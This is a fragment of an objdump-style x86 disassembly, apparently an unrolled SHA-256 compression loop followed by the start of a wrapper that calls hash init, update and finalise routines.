  4082e3:	0b d8                	or     %eax,%ebx
  4082e5:	8b 44 24 20          	mov    0x20(%esp),%eax
  4082e9:	03 d9                	add    %ecx,%ebx
  4082eb:	83 c0 20             	add    $0x20,%eax
  4082ee:	89 5c 24 1c          	mov    %ebx,0x1c(%esp)
  4082f2:	8b 5c 24 2c          	mov    0x2c(%esp),%ebx
  4082f6:	89 44 24 20          	mov    %eax,0x20(%esp)
  4082fa:	83 f8 40             	cmp    $0x40,%eax
  4082fd:	0f 82 ae fc ff ff    	jb     0x407fb1
  408303:	6a 40                	push   $0x40
  408305:	89 74 24 24          	mov    %esi,0x24(%esp)
  408309:	5d                   	pop    %ebp
  40830a:	8b 4c 2c 54          	mov    0x54(%esp,%ebp,1),%ecx
  40830e:	8b d1                	mov    %ecx,%edx
  408310:	8b 74 2c 20          	mov    0x20(%esp,%ebp,1),%esi
  408314:	8b c1                	mov    %ecx,%eax
  408316:	c1 c0 0d             	rol    $0xd,%eax
  408319:	c1 c2 0f             	rol    $0xf,%edx
  40831c:	33 d0                	xor    %eax,%edx
  40831e:	8b c1                	mov    %ecx,%eax
  408320:	c1 e8 0a             	shr    $0xa,%eax
  408323:	8b ce                	mov    %esi,%ecx
  408325:	33 d0                	xor    %eax,%edx
  408327:	c1 c1 0e             	rol    $0xe,%ecx
  40832a:	8b c6                	mov    %esi,%eax
  40832c:	c1 c8 07             	ror    $0x7,%eax
  40832f:	33 c8                	xor    %eax,%ecx
  408331:	8b c6                	mov    %esi,%eax
  408333:	c1 e8 03             	shr    $0x3,%eax
  408336:	33 c8                	xor    %eax,%ecx
  408338:	8b 44 24 24          	mov    0x24(%esp),%eax
  40833c:	03 d1                	add    %ecx,%edx
  40833e:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  408342:	03 54 2c 1c          	add    0x1c(%esp,%ebp,1),%edx
  408346:	8b 6c 2c 40          	mov    0x40(%esp,%ebp,1),%ebp
  40834a:	03 ea                	add    %edx,%ebp
  40834c:	8b d1                	mov    %ecx,%edx
  40834e:	89 6c 04 5c          	mov    %ebp,0x5c(%esp,%eax,1)
  408352:	8b c1                	mov    %ecx,%eax
  408354:	c1 c0 07             	rol    $0x7,%eax
  408357:	c1 ca 0b             	ror    $0xb,%edx
  40835a:	33 d0                	xor    %eax,%edx
  40835c:	89 6c 24 34          	mov    %ebp,0x34(%esp)
  408360:	8b c1                	mov    %ecx,%eax
  408362:	c1 c8 06             	ror    $0x6,%eax
  408365:	33 d0                	xor    %eax,%edx
  408367:	8b 44 24 28          	mov    0x28(%esp),%eax
  40836b:	33 c3                	xor    %ebx,%eax
  40836d:	23 c1                	and    %ecx,%eax
  40836f:	33 c3                	xor    %ebx,%eax
  408371:	03 d0                	add    %eax,%edx
  408373:	8b 44 24 24          	mov    0x24(%esp),%eax
  408377:	03 90 a8 1e 40 00    	add    0x401ea8(%eax),%edx
  40837d:	03 d5                	add    %ebp,%edx
  40837f:	8b 6c 24 1c          	mov    0x1c(%esp),%ebp
  408383:	8b cd                	mov    %ebp,%ecx
  408385:	8b c5                	mov    %ebp,%eax
  408387:	c1 c0 0a             	rol    $0xa,%eax
  40838a:	03 d7                	add    %edi,%edx
  40838c:	01 54 24 10          	add    %edx,0x10(%esp)
  408390:	c1 c9 0d             	ror    $0xd,%ecx
  408393:	33 c8                	xor    %eax,%ecx
  408395:	8b c5                	mov    %ebp,%eax
  408397:	c1 c8 02             	ror    $0x2,%eax
  40839a:	33 c8                	xor    %eax,%ecx
  40839c:	8b 44 24 18          	mov    0x18(%esp),%eax
  4083a0:	8b d8                	mov    %eax,%ebx
  4083a2:	03 ca                	add    %edx,%ecx
  4083a4:	23 c5                	and    %ebp,%eax
  4083a6:	0b dd                	or     %ebp,%ebx
  4083a8:	23 5c 24 14          	and    0x14(%esp),%ebx
  4083ac:	0b d8                	or     %eax,%ebx
  4083ae:	03 d9                	add    %ecx,%ebx
  4083b0:	89 5c 24 30          	mov    %ebx,0x30(%esp)
  4083b4:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  4083b8:	8b 4c 1c 58          	mov    0x58(%esp,%ebx,1),%ecx
  4083bc:	8b d1                	mov    %ecx,%edx
  4083be:	8b 7c 1c 24          	mov    0x24(%esp,%ebx,1),%edi
  4083c2:	8b c1                	mov    %ecx,%eax
  4083c4:	c1 c0 0d             	rol    $0xd,%eax
  4083c7:	c1 c2 0f             	rol    $0xf,%edx
  4083ca:	33 d0                	xor    %eax,%edx
  4083cc:	8b c1                	mov    %ecx,%eax
  4083ce:	c1 e8 0a             	shr    $0xa,%eax
  4083d1:	8b cf                	mov    %edi,%ecx
  4083d3:	33 d0                	xor    %eax,%edx
  4083d5:	c1 c1 0e             	rol    $0xe,%ecx
  4083d8:	8b c7                	mov    %edi,%eax
  4083da:	c1 c8 07             	ror    $0x7,%eax
  4083dd:	33 c8                	xor    %eax,%ecx
  4083df:	8b c7                	mov    %edi,%eax
  4083e1:	c1 e8 03             	shr    $0x3,%eax
  4083e4:	33 c8                	xor    %eax,%ecx
  4083e6:	8b 44 24 24          	mov    0x24(%esp),%eax
  4083ea:	03 d1                	add    %ecx,%edx
  4083ec:	03 54 1c 44          	add    0x44(%esp,%ebx,1),%edx
  4083f0:	8d 1c 32             	lea    (%edx,%esi,1),%ebx
  4083f3:	8b 74 24 10          	mov    0x10(%esp),%esi
  4083f7:	89 5c 04 60          	mov    %ebx,0x60(%esp,%eax,1)
  4083fb:	8b d6                	mov    %esi,%edx
  4083fd:	c1 ca 0b             	ror    $0xb,%edx
  408400:	8b c6                	mov    %esi,%eax
  408402:	c1 c0 07             	rol    $0x7,%eax
  408405:	33 d0                	xor    %eax,%edx
  408407:	8b c6                	mov    %esi,%eax
  408409:	c1 c8 06             	ror    $0x6,%eax
  40840c:	33 d0                	xor    %eax,%edx
  40840e:	8b 44 24 28          	mov    0x28(%esp),%eax
  408412:	33 44 24 20          	xor    0x20(%esp),%eax
  408416:	23 c6                	and    %esi,%eax
  408418:	8b 74 24 30          	mov    0x30(%esp),%esi
  40841c:	33 44 24 28          	xor    0x28(%esp),%eax
  408420:	8b ce                	mov    %esi,%ecx
  408422:	03 d0                	add    %eax,%edx
  408424:	c1 c9 0d             	ror    $0xd,%ecx
  408427:	8b 44 24 24          	mov    0x24(%esp),%eax
  40842b:	03 90 ac 1e 40 00    	add    0x401eac(%eax),%edx
  408431:	8b c6                	mov    %esi,%eax
  408433:	03 54 24 2c          	add    0x2c(%esp),%edx
  408437:	c1 c0 0a             	rol    $0xa,%eax
  40843a:	03 d3                	add    %ebx,%edx
  40843c:	33 c8                	xor    %eax,%ecx
  40843e:	01 54 24 14          	add    %edx,0x14(%esp)
  408442:	8b c6                	mov    %esi,%eax
  408444:	c1 c8 02             	ror    $0x2,%eax
  408447:	33 c8                	xor    %eax,%ecx
  408449:	8b c5                	mov    %ebp,%eax
  40844b:	0b c6                	or     %esi,%eax
  40844d:	03 ca                	add    %edx,%ecx
  40844f:	23 44 24 18          	and    0x18(%esp),%eax
  408453:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  408457:	8b c5                	mov    %ebp,%eax
  408459:	8b 6c 24 34          	mov    0x34(%esp),%ebp
  40845d:	23 c6                	and    %esi,%eax
  40845f:	8b 74 24 2c          	mov    0x2c(%esp),%esi
  408463:	8b d5                	mov    %ebp,%edx
  408465:	0b f0                	or     %eax,%esi
  408467:	c1 c2 0f             	rol    $0xf,%edx
  40846a:	8b 44 24 24          	mov    0x24(%esp),%eax
  40846e:	03 f1                	add    %ecx,%esi
  408470:	89 74 24 2c          	mov    %esi,0x2c(%esp)
  408474:	8b 74 04 28          	mov    0x28(%esp,%eax,1),%esi
  408478:	8b c5                	mov    %ebp,%eax
  40847a:	c1 c0 0d             	rol    $0xd,%eax
  40847d:	8b ce                	mov    %esi,%ecx
  40847f:	33 d0                	xor    %eax,%edx
  408481:	c1 c1 0e             	rol    $0xe,%ecx
  408484:	8b c6                	mov    %esi,%eax
  408486:	c1 ed 0a             	shr    $0xa,%ebp
  408489:	c1 c8 07             	ror    $0x7,%eax
  40848c:	33 ea                	xor    %edx,%ebp
  40848e:	33 c8                	xor    %eax,%ecx
  408490:	8b c6                	mov    %esi,%eax
  408492:	c1 e8 03             	shr    $0x3,%eax
  408495:	33 c8                	xor    %eax,%ecx
  408497:	8b 44 24 24          	mov    0x24(%esp),%eax
  40849b:	03 e9                	add    %ecx,%ebp
  40849d:	03 6c 04 48          	add    0x48(%esp,%eax,1),%ebp
  4084a1:	03 ef                	add    %edi,%ebp
  4084a3:	8b 7c 24 14          	mov    0x14(%esp),%edi
  4084a7:	89 6c 04 64          	mov    %ebp,0x64(%esp,%eax,1)
  4084ab:	8b d7                	mov    %edi,%edx
  4084ad:	c1 ca 0b             	ror    $0xb,%edx
  4084b0:	8b c7                	mov    %edi,%eax
  4084b2:	c1 c0 07             	rol    $0x7,%eax
  4084b5:	33 d0                	xor    %eax,%edx
  4084b7:	8b c7                	mov    %edi,%eax
  4084b9:	c1 c8 06             	ror    $0x6,%eax
  4084bc:	33 d0                	xor    %eax,%edx
  4084be:	8b 44 24 10          	mov    0x10(%esp),%eax
  4084c2:	33 44 24 20          	xor    0x20(%esp),%eax
  4084c6:	23 c7                	and    %edi,%eax
  4084c8:	33 44 24 20          	xor    0x20(%esp),%eax
  4084cc:	03 d0                	add    %eax,%edx
  4084ce:	8b 44 24 24          	mov    0x24(%esp),%eax
  4084d2:	8b 7c 24 2c          	mov    0x2c(%esp),%edi
  4084d6:	8b cf                	mov    %edi,%ecx
  4084d8:	c1 c9 0d             	ror    $0xd,%ecx
  4084db:	03 90 b0 1e 40 00    	add    0x401eb0(%eax),%edx
  4084e1:	8b c7                	mov    %edi,%eax
  4084e3:	c1 c0 0a             	rol    $0xa,%eax
  4084e6:	03 d5                	add    %ebp,%edx
  4084e8:	03 54 24 28          	add    0x28(%esp),%edx
  4084ec:	33 c8                	xor    %eax,%ecx
  4084ee:	01 54 24 18          	add    %edx,0x18(%esp)
  4084f2:	8b c7                	mov    %edi,%eax
  4084f4:	c1 c8 02             	ror    $0x2,%eax
  4084f7:	33 c8                	xor    %eax,%ecx
  4084f9:	8b 44 24 30          	mov    0x30(%esp),%eax
  4084fd:	89 44 24 28          	mov    %eax,0x28(%esp)
  408501:	03 ca                	add    %edx,%ecx
  408503:	09 7c 24 28          	or     %edi,0x28(%esp)
  408507:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  40850b:	21 44 24 28          	and    %eax,0x28(%esp)
  40850f:	8b 44 24 30          	mov    0x30(%esp),%eax
  408513:	23 c7                	and    %edi,%eax
  408515:	8b 7c 24 28          	mov    0x28(%esp),%edi
  408519:	0b f8                	or     %eax,%edi
  40851b:	8b 44 24 24          	mov    0x24(%esp),%eax
  40851f:	03 f9                	add    %ecx,%edi
  408521:	8b cb                	mov    %ebx,%ecx
  408523:	89 7c 24 28          	mov    %edi,0x28(%esp)
  408527:	c1 c1 0f             	rol    $0xf,%ecx
  40852a:	8b 7c 04 2c          	mov    0x2c(%esp,%eax,1),%edi
  40852e:	8b d7                	mov    %edi,%edx
  408530:	c1 c2 0e             	rol    $0xe,%edx
  408533:	8b c7                	mov    %edi,%eax
  408535:	c1 c8 07             	ror    $0x7,%eax
  408538:	33 d0                	xor    %eax,%edx
  40853a:	8b c7                	mov    %edi,%eax
  40853c:	c1 e8 03             	shr    $0x3,%eax
  40853f:	33 d0                	xor    %eax,%edx
  408541:	8b c3                	mov    %ebx,%eax
  408543:	c1 c0 0d             	rol    $0xd,%eax
  408546:	33 c8                	xor    %eax,%ecx
  408548:	c1 eb 0a             	shr    $0xa,%ebx
  40854b:	8b 44 24 24          	mov    0x24(%esp),%eax
  40854f:	33 d9                	xor    %ecx,%ebx
  408551:	03 da                	add    %edx,%ebx
  408553:	03 5c 04 4c          	add    0x4c(%esp,%eax,1),%ebx
  408557:	03 de                	add    %esi,%ebx
  408559:	8b 74 24 18          	mov    0x18(%esp),%esi
  40855d:	89 5c 04 68          	mov    %ebx,0x68(%esp,%eax,1)
  408561:	8b d6                	mov    %esi,%edx
  408563:	c1 ca 0b             	ror    $0xb,%edx
  408566:	8b c6                	mov    %esi,%eax
  408568:	c1 c0 07             	rol    $0x7,%eax
  40856b:	33 d0                	xor    %eax,%edx
  40856d:	8b c6                	mov    %esi,%eax
  40856f:	c1 c8 06             	ror    $0x6,%eax
  408572:	33 d0                	xor    %eax,%edx
  408574:	8b 44 24 14          	mov    0x14(%esp),%eax
  408578:	33 44 24 10          	xor    0x10(%esp),%eax
  40857c:	23 c6                	and    %esi,%eax
  40857e:	8b 74 24 28          	mov    0x28(%esp),%esi
  408582:	33 44 24 10          	xor    0x10(%esp),%eax
  408586:	8b ce                	mov    %esi,%ecx
  408588:	03 d0                	add    %eax,%edx
  40858a:	c1 c9 0d             	ror    $0xd,%ecx
  40858d:	8b 44 24 24          	mov    0x24(%esp),%eax
  408591:	03 90 b4 1e 40 00    	add    0x401eb4(%eax),%edx
  408597:	8b c6                	mov    %esi,%eax
  408599:	c1 c0 0a             	rol    $0xa,%eax
  40859c:	03 d3                	add    %ebx,%edx
  40859e:	03 54 24 20          	add    0x20(%esp),%edx
  4085a2:	33 c8                	xor    %eax,%ecx
  4085a4:	01 54 24 1c          	add    %edx,0x1c(%esp)
  4085a8:	8b c6                	mov    %esi,%eax
  4085aa:	c1 c8 02             	ror    $0x2,%eax
  4085ad:	33 c8                	xor    %eax,%ecx
  4085af:	8b c6                	mov    %esi,%eax
  4085b1:	0b 44 24 2c          	or     0x2c(%esp),%eax
  4085b5:	23 44 24 30          	and    0x30(%esp),%eax
  4085b9:	89 44 24 20          	mov    %eax,0x20(%esp)
  4085bd:	8b c6                	mov    %esi,%eax
  4085bf:	23 44 24 2c          	and    0x2c(%esp),%eax
  4085c3:	03 ca                	add    %edx,%ecx
  4085c5:	8b 74 24 20          	mov    0x20(%esp),%esi
  4085c9:	0b f0                	or     %eax,%esi
  4085cb:	8b 44 24 24          	mov    0x24(%esp),%eax
  4085cf:	03 f1                	add    %ecx,%esi
  4085d1:	8b cd                	mov    %ebp,%ecx
  4085d3:	89 74 24 20          	mov    %esi,0x20(%esp)
  4085d7:	c1 c1 0f             	rol    $0xf,%ecx
  4085da:	8b 74 04 30          	mov    0x30(%esp,%eax,1),%esi
  4085de:	8b d6                	mov    %esi,%edx
  4085e0:	c1 c2 0e             	rol    $0xe,%edx
  4085e3:	8b c6                	mov    %esi,%eax
  4085e5:	c1 c8 07             	ror    $0x7,%eax
  4085e8:	33 d0                	xor    %eax,%edx
  4085ea:	8b c6                	mov    %esi,%eax
  4085ec:	c1 e8 03             	shr    $0x3,%eax
  4085ef:	33 d0                	xor    %eax,%edx
  4085f1:	8b c5                	mov    %ebp,%eax
  4085f3:	c1 c0 0d             	rol    $0xd,%eax
  4085f6:	33 c8                	xor    %eax,%ecx
  4085f8:	c1 ed 0a             	shr    $0xa,%ebp
  4085fb:	8b 44 24 24          	mov    0x24(%esp),%eax
  4085ff:	33 e9                	xor    %ecx,%ebp
  408601:	03 ea                	add    %edx,%ebp
  408603:	03 6c 04 50          	add    0x50(%esp,%eax,1),%ebp
  408607:	03 ef                	add    %edi,%ebp
  408609:	8b 7c 24 1c          	mov    0x1c(%esp),%edi
  40860d:	89 6c 04 6c          	mov    %ebp,0x6c(%esp,%eax,1)
  408611:	8b d7                	mov    %edi,%edx
  408613:	c1 ca 0b             	ror    $0xb,%edx
  408616:	8b c7                	mov    %edi,%eax
  408618:	c1 c0 07             	rol    $0x7,%eax
  40861b:	33 d0                	xor    %eax,%edx
  40861d:	8b c7                	mov    %edi,%eax
  40861f:	c1 c8 06             	ror    $0x6,%eax
  408622:	33 d0                	xor    %eax,%edx
  408624:	8b 44 24 14          	mov    0x14(%esp),%eax
  408628:	33 44 24 18          	xor    0x18(%esp),%eax
  40862c:	23 c7                	and    %edi,%eax
  40862e:	8b 7c 24 20          	mov    0x20(%esp),%edi
  408632:	33 44 24 14          	xor    0x14(%esp),%eax
  408636:	8b cf                	mov    %edi,%ecx
  408638:	03 d0                	add    %eax,%edx
  40863a:	c1 c9 0d             	ror    $0xd,%ecx
  40863d:	8b 44 24 24          	mov    0x24(%esp),%eax
  408641:	03 90 b8 1e 40 00    	add    0x401eb8(%eax),%edx
  408647:	8b 44 24 30          	mov    0x30(%esp),%eax
  40864b:	03 d5                	add    %ebp,%edx
  40864d:	03 54 24 10          	add    0x10(%esp),%edx
  408651:	03 c2                	add    %edx,%eax
  408653:	89 44 24 30          	mov    %eax,0x30(%esp)
  408657:	89 44 24 54          	mov    %eax,0x54(%esp)
  40865b:	8b c7                	mov    %edi,%eax
  40865d:	c1 c0 0a             	rol    $0xa,%eax
  408660:	33 c8                	xor    %eax,%ecx
  408662:	8b c7                	mov    %edi,%eax
  408664:	c1 c8 02             	ror    $0x2,%eax
  408667:	33 c8                	xor    %eax,%ecx
  408669:	8b 44 24 28          	mov    0x28(%esp),%eax
  40866d:	89 44 24 10          	mov    %eax,0x10(%esp)
  408671:	03 ca                	add    %edx,%ecx
  408673:	0b c7                	or     %edi,%eax
  408675:	8b d3                	mov    %ebx,%edx
  408677:	23 44 24 2c          	and    0x2c(%esp),%eax
  40867b:	89 44 24 10          	mov    %eax,0x10(%esp)
  40867f:	8b 44 24 28          	mov    0x28(%esp),%eax
  408683:	23 c7                	and    %edi,%eax
  408685:	c1 c2 0f             	rol    $0xf,%edx
  408688:	8b 7c 24 10          	mov    0x10(%esp),%edi
  40868c:	0b f8                	or     %eax,%edi
  40868e:	8b 44 24 24          	mov    0x24(%esp),%eax
  408692:	03 f9                	add    %ecx,%edi
  408694:	89 7c 24 10          	mov    %edi,0x10(%esp)
  408698:	89 7c 24 44          	mov    %edi,0x44(%esp)
  40869c:	8b 7c 04 34          	mov    0x34(%esp,%eax,1),%edi
  4086a0:	8b c3                	mov    %ebx,%eax
  4086a2:	c1 c0 0d             	rol    $0xd,%eax
  4086a5:	33 d0                	xor    %eax,%edx
  4086a7:	c1 eb 0a             	shr    $0xa,%ebx
  4086aa:	33 d3                	xor    %ebx,%edx
  4086ac:	8b 4c 24 30          	mov    0x30(%esp),%ecx
  4086b0:	8b df                	mov    %edi,%ebx
  4086b2:	c1 c3 0e             	rol    $0xe,%ebx
  4086b5:	8b c7                	mov    %edi,%eax
  4086b7:	c1 c8 07             	ror    $0x7,%eax
  4086ba:	33 d8                	xor    %eax,%ebx
  4086bc:	8b c7                	mov    %edi,%eax
  4086be:	c1 e8 03             	shr    $0x3,%eax
  4086c1:	33 d8                	xor    %eax,%ebx
  4086c3:	8b 44 24 24          	mov    0x24(%esp),%eax
  4086c7:	03 54 04 54          	add    0x54(%esp,%eax,1),%edx
  4086cb:	03 da                	add    %edx,%ebx
  4086cd:	8b d1                	mov    %ecx,%edx
  4086cf:	03 de                	add    %esi,%ebx
  4086d1:	c1 ca 0b             	ror    $0xb,%edx
  4086d4:	89 5c 04 70          	mov    %ebx,0x70(%esp,%eax,1)
  4086d8:	8b c1                	mov    %ecx,%eax
  4086da:	c1 c0 07             	rol    $0x7,%eax
  4086dd:	33 d0                	xor    %eax,%edx
  4086df:	8b 74 24 10          	mov    0x10(%esp),%esi
  4086e3:	8b c1                	mov    %ecx,%eax
  4086e5:	c1 c8 06             	ror    $0x6,%eax
  4086e8:	33 d0                	xor    %eax,%edx
  4086ea:	8b 44 24 18          	mov    0x18(%esp),%eax
  4086ee:	33 44 24 1c          	xor    0x1c(%esp),%eax
  4086f2:	23 c1                	and    %ecx,%eax
  4086f4:	8b ce                	mov    %esi,%ecx
  4086f6:	33 44 24 18          	xor    0x18(%esp),%eax
  4086fa:	03 d0                	add    %eax,%edx
  4086fc:	c1 c9 0d             	ror    $0xd,%ecx
  4086ff:	8b 44 24 24          	mov    0x24(%esp),%eax
  408703:	03 90 bc 1e 40 00    	add    0x401ebc(%eax),%edx
  408709:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  40870d:	03 d3                	add    %ebx,%edx
  40870f:	03 54 24 14          	add    0x14(%esp),%edx
  408713:	03 c2                	add    %edx,%eax
  408715:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  408719:	89 44 24 50          	mov    %eax,0x50(%esp)
  40871d:	8b c6                	mov    %esi,%eax
  40871f:	c1 c0 0a             	rol    $0xa,%eax
  408722:	33 c8                	xor    %eax,%ecx
  408724:	8b c6                	mov    %esi,%eax
  408726:	c1 c8 02             	ror    $0x2,%eax
  408729:	33 c8                	xor    %eax,%ecx
  40872b:	8b c6                	mov    %esi,%eax
  40872d:	0b 44 24 20          	or     0x20(%esp),%eax
  408731:	03 ca                	add    %edx,%ecx
  408733:	23 44 24 28          	and    0x28(%esp),%eax
  408737:	89 44 24 14          	mov    %eax,0x14(%esp)
  40873b:	8b c6                	mov    %esi,%eax
  40873d:	23 44 24 20          	and    0x20(%esp),%eax
  408741:	8b 74 24 14          	mov    0x14(%esp),%esi
  408745:	0b f0                	or     %eax,%esi
  408747:	8b 44 24 24          	mov    0x24(%esp),%eax
  40874b:	03 f1                	add    %ecx,%esi
  40874d:	8b cd                	mov    %ebp,%ecx
  40874f:	89 74 24 14          	mov    %esi,0x14(%esp)
  408753:	89 74 24 40          	mov    %esi,0x40(%esp)
  408757:	8b 74 04 38          	mov    0x38(%esp,%eax,1),%esi
  40875b:	8b d6                	mov    %esi,%edx
  40875d:	c1 c2 0e             	rol    $0xe,%edx
  408760:	8b c6                	mov    %esi,%eax
  408762:	c1 c8 07             	ror    $0x7,%eax
  408765:	33 d0                	xor    %eax,%edx
  408767:	c1 c1 0f             	rol    $0xf,%ecx
  40876a:	8b c6                	mov    %esi,%eax
  40876c:	c1 e8 03             	shr    $0x3,%eax
  40876f:	33 d0                	xor    %eax,%edx
  408771:	8b c5                	mov    %ebp,%eax
  408773:	c1 c0 0d             	rol    $0xd,%eax
  408776:	33 c8                	xor    %eax,%ecx
  408778:	c1 ed 0a             	shr    $0xa,%ebp
  40877b:	8b 44 24 24          	mov    0x24(%esp),%eax
  40877f:	33 cd                	xor    %ebp,%ecx
  408781:	8b 6c 24 2c          	mov    0x2c(%esp),%ebp
  408785:	03 54 04 58          	add    0x58(%esp,%eax,1),%edx
  408789:	03 ca                	add    %edx,%ecx
  40878b:	8b d5                	mov    %ebp,%edx
  40878d:	03 cf                	add    %edi,%ecx
  40878f:	c1 ca 0b             	ror    $0xb,%edx
  408792:	89 4c 04 74          	mov    %ecx,0x74(%esp,%eax,1)
  408796:	8b c5                	mov    %ebp,%eax
  408798:	c1 c0 07             	rol    $0x7,%eax
  40879b:	33 d0                	xor    %eax,%edx
  40879d:	8b c5                	mov    %ebp,%eax
  40879f:	c1 c8 06             	ror    $0x6,%eax
  4087a2:	33 d0                	xor    %eax,%edx
  4087a4:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  4087a8:	33 44 24 30          	xor    0x30(%esp),%eax
  4087ac:	23 c5                	and    %ebp,%eax
  4087ae:	8b 6c 24 28          	mov    0x28(%esp),%ebp
  4087b2:	33 44 24 1c          	xor    0x1c(%esp),%eax
  4087b6:	03 d0                	add    %eax,%edx
  4087b8:	8b 44 24 24          	mov    0x24(%esp),%eax
  4087bc:	03 90 c0 1e 40 00    	add    0x401ec0(%eax),%edx
  4087c2:	8b 44 24 14          	mov    0x14(%esp),%eax
  4087c6:	03 d1                	add    %ecx,%edx
  4087c8:	03 54 24 18          	add    0x18(%esp),%edx
  4087cc:	8b c8                	mov    %eax,%ecx
  4087ce:	c1 c0 0a             	rol    $0xa,%eax
  4087d1:	03 ea                	add    %edx,%ebp
  4087d3:	c1 c9 0d             	ror    $0xd,%ecx
  4087d6:	33 c8                	xor    %eax,%ecx
  4087d8:	89 6c 24 28          	mov    %ebp,0x28(%esp)
  4087dc:	8b 44 24 14          	mov    0x14(%esp),%eax
  4087e0:	c1 c8 02             	ror    $0x2,%eax
  4087e3:	33 c8                	xor    %eax,%ecx
  4087e5:	89 6c 24 4c          	mov    %ebp,0x4c(%esp)
  4087e9:	8b 44 24 14          	mov    0x14(%esp),%eax
  4087ed:	03 ca                	add    %edx,%ecx
  4087ef:	8b f8                	mov    %eax,%edi
  4087f1:	23 44 24 10          	and    0x10(%esp),%eax
  4087f5:	0b 7c 24 10          	or     0x10(%esp),%edi
  4087f9:	23 7c 24 20          	and    0x20(%esp),%edi
  4087fd:	0b f8                	or     %eax,%edi
  4087ff:	8b c7                	mov    %edi,%eax
  408801:	89 7c 24 18          	mov    %edi,0x18(%esp)
  408805:	03 c1                	add    %ecx,%eax
  408807:	8b 7c 24 30          	mov    0x30(%esp),%edi
  40880b:	89 44 24 18          	mov    %eax,0x18(%esp)
  40880f:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  408813:	8b 44 24 24          	mov    0x24(%esp),%eax
  408817:	8b 4c 04 3c          	mov    0x3c(%esp,%eax,1),%ecx
  40881b:	8b d1                	mov    %ecx,%edx
  40881d:	c1 c2 0e             	rol    $0xe,%edx
  408820:	8b c1                	mov    %ecx,%eax
  408822:	c1 c8 07             	ror    $0x7,%eax
  408825:	33 d0                	xor    %eax,%edx
  408827:	c1 e9 03             	shr    $0x3,%ecx
  40882a:	33 d1                	xor    %ecx,%edx
  40882c:	8b c3                	mov    %ebx,%eax
  40882e:	03 54 24 34          	add    0x34(%esp),%edx
  408832:	8b cb                	mov    %ebx,%ecx
  408834:	c1 c0 0d             	rol    $0xd,%eax
  408837:	c1 c1 0f             	rol    $0xf,%ecx
  40883a:	33 c8                	xor    %eax,%ecx
  40883c:	c1 eb 0a             	shr    $0xa,%ebx
  40883f:	33 cb                	xor    %ebx,%ecx
  408841:	8b c5                	mov    %ebp,%eax
  408843:	8b 5c 24 2c          	mov    0x2c(%esp),%ebx
  408847:	03 ca                	add    %edx,%ecx
  408849:	c1 c0 07             	rol    $0x7,%eax
  40884c:	8b d5                	mov    %ebp,%edx
  40884e:	c1 ca 0b             	ror    $0xb,%edx
  408851:	03 ce                	add    %esi,%ecx
  408853:	8b 74 24 24          	mov    0x24(%esp),%esi
  408857:	33 d0                	xor    %eax,%edx
  408859:	8b c5                	mov    %ebp,%eax
  40885b:	c1 c8 06             	ror    $0x6,%eax
  40885e:	33 d0                	xor    %eax,%edx
  408860:	8b c7                	mov    %edi,%eax
  408862:	33 c3                	xor    %ebx,%eax
  408864:	89 4c 34 78          	mov    %ecx,0x78(%esp,%esi,1)
  408868:	23 c5                	and    %ebp,%eax
  40886a:	33 c7                	xor    %edi,%eax
  40886c:	03 d0                	add    %eax,%edx
  40886e:	8b 44 24 20          	mov    0x20(%esp),%eax
  408872:	03 96 c4 1e 40 00    	add    0x401ec4(%esi),%edx
  408878:	03 d1                	add    %ecx,%edx
  40887a:	03 54 24 1c          	add    0x1c(%esp),%edx
  40887e:	03 c2                	add    %edx,%eax
  408880:	89 44 24 20          	mov    %eax,0x20(%esp)
  408884:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  408888:	8b cd                	mov    %ebp,%ecx
  40888a:	89 44 24 48          	mov    %eax,0x48(%esp)
  40888e:	8b c5                	mov    %ebp,%eax
  408890:	c1 c0 0a             	rol    $0xa,%eax
  408893:	c1 c9 0d             	ror    $0xd,%ecx
  408896:	33 c8                	xor    %eax,%ecx
  408898:	8b c5                	mov    %ebp,%eax
  40889a:	c1 c8 02             	ror    $0x2,%eax
  40889d:	33 c8                	xor    %eax,%ecx
  40889f:	8b 44 24 14          	mov    0x14(%esp),%eax
  4088a3:	8b f0                	mov    %eax,%esi
  4088a5:	03 ca                	add    %edx,%ecx
  4088a7:	0b f5                	or     %ebp,%esi
  4088a9:	23 c5                	and    %ebp,%eax
  4088ab:	23 74 24 10          	and    0x10(%esp),%esi
  4088af:	8b 6c 24 24          	mov    0x24(%esp),%ebp
  4088b3:	0b f0                	or     %eax,%esi
  4088b5:	03 f1                	add    %ecx,%esi
  4088b7:	83 c5 20             	add    $0x20,%ebp
  4088ba:	89 74 24 1c          	mov    %esi,0x1c(%esp)
  4088be:	89 74 24 38          	mov    %esi,0x38(%esp)
  4088c2:	89 6c 24 24          	mov    %ebp,0x24(%esp)
  4088c6:	81 fd 00 01 00 00    	cmp    $0x100,%ebp
  4088cc:	0f 82 38 fa ff ff    	jb     0x40830a
  4088d2:	8b 54 24 58          	mov    0x58(%esp),%edx
  4088d6:	33 c9                	xor    %ecx,%ecx
  4088d8:	5f                   	pop    %edi
  4088d9:	5e                   	pop    %esi
  4088da:	5d                   	pop    %ebp
  4088db:	5b                   	pop    %ebx
  4088dc:	8b 44 8c 28          	mov    0x28(%esp,%ecx,4),%eax
  4088e0:	01 02                	add    %eax,(%edx)
  4088e2:	41                   	inc    %ecx
  4088e3:	8d 52 04             	lea    0x4(%edx),%edx
  4088e6:	83 f9 08             	cmp    $0x8,%ecx
  4088e9:	72 f1                	jb     0x4088dc
  4088eb:	81 c4 4c 01 00 00    	add    $0x14c,%esp
  4088f1:	c2 08 00             	ret    $0x8
  4088f4:	55                   	push   %ebp
  4088f5:	8b ec                	mov    %esp,%ebp
  4088f7:	83 ec 6c             	sub    $0x6c,%esp
  4088fa:	8d 45 94             	lea    -0x6c(%ebp),%eax
  4088fd:	50                   	push   %eax
  4088fe:	e8 44 f3 ff ff       	call   0x407c47
  408903:	ff 75 14             	push   0x14(%ebp)
  408906:	8d 45 94             	lea    -0x6c(%ebp),%eax
  408909:	50                   	push   %eax
  40890a:	e8 74 f3 ff ff       	call   0x407c83
  40890f:	ff 75 0c             	push   0xc(%ebp)
  408912:	8d 45 94             	lea    -0x6c(%ebp),%eax
  408915:	ff 75 08             	push   0x8(%ebp)
  408918:	50                   	push   %eax
  408919:	e8 f0 f3 ff ff       	call   0x407d0e
